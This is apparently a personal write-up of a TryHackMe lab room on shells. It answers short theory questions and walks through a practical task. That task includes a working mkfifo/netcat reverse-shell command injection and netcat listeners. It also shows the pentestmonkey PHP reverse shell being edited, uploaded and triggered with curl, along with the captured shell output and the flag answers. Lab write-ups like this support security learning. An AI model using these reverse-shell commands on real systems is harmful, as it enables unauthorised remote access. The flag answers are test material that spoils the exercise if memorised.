---
title: Shells Overview
date: 2025-11-11
draft: false
tags:
  - TryHackMe
  - Cybersecurity
  - Shell
---
**Note:** 

- The questions are shortened for a cleaner view.
- Questions that are straightforward will only have answers attached. Such questions can be easily answered by reading the documentation given in the room.

**Task 1 - 7 are theoretical**

## Task 1 - Room Introduction

No answer needed

---
## Task 2 - Shell Overview

#### 1) What is the command-line interface that...?

**Ans:** `Shell`

#### 2) What process involves using a compromised...?

**Ans:** `Pivoting`

> Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting.

#### 3) What is a common activity attackers...?

**Ans:** `Privilege Escalation`

---
## Task 3 - Reverse Shell

#### 1) What type of shell allows an attacker...?

**Ans:** `Reverse Shell`

#### 2) What tool is commonly used to set up a listener for a reverse shell?

**Ans:** `Netcat`

---
## Task 4 - Bind Shell

#### 1) What type of shell opens a specific port on the target for incoming...?

**Ans:** `Bind Shell`

#### 2) Listening below which port number requires...?

**Ans:** `1024`

---
## Task 5 - Shell Listeners 

#### 1) Which flexible networking tool allows you...?

**Ans:** `socat`

#### 2) Which command-line utility provides readline-style editing...?

**Ans:** `rlwrap`

#### 3) What is the improved version of Netcat...?

**Ans:** `ncat`

---
## Task 6 - Shell Payloads

#### 1) Which Python module is commonly...?

**Ans:** `subprocess`

#### 2) What shell payload method in a common...?

**Ans:** `php`

#### 3) Which scripting language can use a reverse shell by exporting...?

**Ans:** `python`

---
## Task 7 - Web Shell 

#### 1) What vulnerability type allows attackers to upload...?

**Ans:** `Unrestricted File Upload`

#### 2) What is a malicious script uploaded to a vulnerable web...?

**Ans:** `Web Shell`

---
## Task 8 - Practical Task

#### 1) Using a reverse or bind shell, exploit the command...?

*First, start a `netcat` listener on your attack box:*

```bash
nc -lvnp 8888
```

*On the webpage at port 8081, we can inject the following command to get the reverse shell:*
*Ensure you edit the right IP addresses.*


```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.49.95.75 8888 >/tmp/f
```

*We should have reverse shell access and can cat the flag.*

```bash
Listening on 0.0.0.0 8888
Connection received on 10.49.171.41 43476
sh: 0: can't access tty; job control turned off
$ ls
hello.txt
index.php
style.css
$ cd /
$ ls
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag.txt	
THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}
```

**Ans:** `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`

#### 2) Using a web shell, exploit the unrestricted file upload...?

*First, start a `netcat` listener on your attack box:*

```bash
nc -lvnp 8888
```

*I decided to go with the following php shell:*

`https://github.com/pentestmonkey/php-reverse-shell.git`

*Clone the repo and make sure to change the IP address and the Port:*

```bash
$VERSION = "1.0";
$ip = '10.49.75.95';  // CHANGE THIS
$port = 8888;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

*After changing the details, save it and upload it to the website.*

*Now we just need to request the uploaded file, I took a guess and sure enough it was in the `/uploads` directory - which is the same one that was used to demonstrate in the room. Ideally you would use something like gobuster to find the directory.*

*You could visit it from your browser or just make a simple curl request.*

```bash
curl http://10.49.171.41:8082/uploads/php-reverse-shell.php
```

*We should have reverse shell access and can cat the flag.*

```bash
Connection received on 10.49.171.41 34146
Linux 2206ad670bad 5.15.0-1053-aws #58~20.04.1-Ubuntu SMP Mon Jan 22 17:15:01 UTC 2024 x86_64 GNU/Linux
 10:53:10 up 29 min,  0 users,  load average: 0.07, 0.02, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag.txt	
THM{202bb14ed12120b31300cfbbbdd35998786b44e5}
```

**Ans:** `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`

---


